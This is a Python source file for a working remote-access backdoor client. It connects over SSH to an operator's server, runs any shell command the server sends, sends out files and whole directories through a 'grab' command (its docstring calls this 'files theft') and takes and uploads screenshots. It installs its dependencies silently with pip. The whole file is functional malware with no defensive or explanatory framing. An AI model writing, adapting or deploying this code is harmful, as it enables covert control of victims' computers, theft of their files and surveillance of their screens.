import argparse
import os
import subprocess
import sys
import time
import requests

try:
    import paramiko
except Exception:
    subprocess.run('pip install paramiko', shell=True)
    import paramiko


class Client:
    def __init__(self, server_ip, server_port):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.server_ip = server_ip
        self.server_port = server_port

    def connect_auth(self, username, password, verbose):
        '''
        Try to connect to the server with given username and password.
        '''
        try:
            self.client.connect(
                self.server_ip, self.server_port,
                username=username, password=password)
            return True
        except Exception as e:
            if verbose:
                print(e)
            return False

    def open_channel(self, verbose):
        '''Open the channel.
        '''
        channel = self.client.get_transport().open_session()
        # check connection communication
        serv_req = channel.recv(2)
        channel.sendall(sys.platform)
        if verbose:
            print(serv_req)
        return channel

    def open_door(self, chan, verbose):
        '''
        Start executing commands getting through the ssh channel from the server.
        '''
        while True:
            command = chan.recv(1024)
            try:
                command = command.decode('utf-8')
                if 'grab' in command:
                    cmd_result = grab(chan, command, verbose)
                elif command == 'screen':
                    cmd_result = send_screen(chan, verbose)
                elif command == 'server stop':
                    try:
                        self.client.close()
                    except Exception as e:
                        print(e)
                    sys.exit(0)
                else:
                    cmd_result = subprocess.check_output(command, shell=True)
                    if not cmd_result:
                        cmd_result = 'done(no result)'
                chan.send(cmd_result)
            except Exception as e:
                chan.send(str(e))


def get_args():
    '''Parse args at startup.
    '''
    parser = argparse.ArgumentParser(description='Client')
    parser.add_argument('sip', help='the server ip')
    parser.add_argument('sp', type=int, help='the server port')
    parser.add_argument('un', help='the username of the ssh connection')
    parser.add_argument('ps', help='the password of the ssh connection')
    parser.add_argument('-v', '--verbose', action='store_true')
    return parser.parse_args()


def check_internet():
    '''Return True if internet access is available'''
    url = 'http://www.google.com/'
    timeout = 5
    try:
        requests.get(url, timeout=timeout)
        return True
    except requests.ConnectionError:
        return False


def send_files(chan, local_path, fname=None, verbose=False):
    '''
    Try to send file(s) from the 'local_path' through the channel.
    '''
    try:
        # check path
        try:
            directory = [fname] if fname else os.listdir(local_path)
        except Exception:
            return '2'
        # check file in dir
        if fname and not os.path.isfile(os.path.join(local_path, fname)):
            return '3'
        chan.send('0')
        count = 0
        for filename in directory:
            # skip if folder
            if not os.path.isfile(os.path.join(local_path, filename)):
                continue
            count += 1
            size = bin(len(filename))[2:].zfill(16)   # encode filename size as 16 bit binary
            chan.send(size.encode())
            chan.send(filename.encode())

            filename = os.path.join(local_path, filename)
            filesize = os.path.getsize(filename)
            filesize = bin(filesize)[2:].zfill(32)   # encode filesize as 32 bit binary
            chan.send(filesize.encode())

            with open(filename, 'rb') as file_to_send:
                fstream = file_to_send.read()
                time.sleep(.05)  # need to send correctly
                chan.sendall(fstream)
            if verbose:
                print(f'[{count}]: File({filename}) sent')
        chan.send('+')
        time.sleep(.1)  # need to double send correctly
        return str(count)
    except Exception:
        return '1'


def grab(chan, grab_command, out_loud=False):
    '''
    Returns the result of files theft.
    '''
    grab_args = grab_command.split()

    if len(grab_args) == 2:
        dir_path = grab_args[1]
        cmd_result = send_files(chan, dir_path, verbose=out_loud)
    elif len(grab_args) == 3:
        dir_path, fname = grab_args[1:]
        cmd_result = send_files(chan, dir_path, fname, out_loud)
    else:
        cmd_result = '4'
    return cmd_result


def send_screen(chan, verbose):
    '''Try to take a screenshot and send to the server.
    '''
    try:
        import pyautogui
    except Exception:
        subprocess.run('pip install pyautogui', shell=True)
        import pyautogui
    try:
        pic = pyautogui.screenshot()
        gmtime = time.gmtime()
        sname = f'scr{gmtime[0]}{gmtime[1]}{gmtime[2]}{gmtime[3]}{gmtime[4]}{gmtime[5]}.png'
        pic.save(sname)
        result = send_files(chan, os.getcwd(), sname, verbose)
        os.remove(os.path.join(os.getcwd(), sname))
    except Exception:
        result = '5'
    return result


def main():
    # parse args
    args = get_args()

    # Create ssh client
    client = Client(args.sip, args.sp)

    # ## uncomment if it's not a lan ##
    # while not check_internet():
    #     time.sleep(5)

    # connect to the server
    if not client.connect_auth(args.un, args.ps, args.verbose):
        sys.exit(1)

    # open channel
    chan = client.open_channel(args.verbose)

    # open door
    client.open_door(chan, args.verbose)


if __name__ == "__main__":
    main()
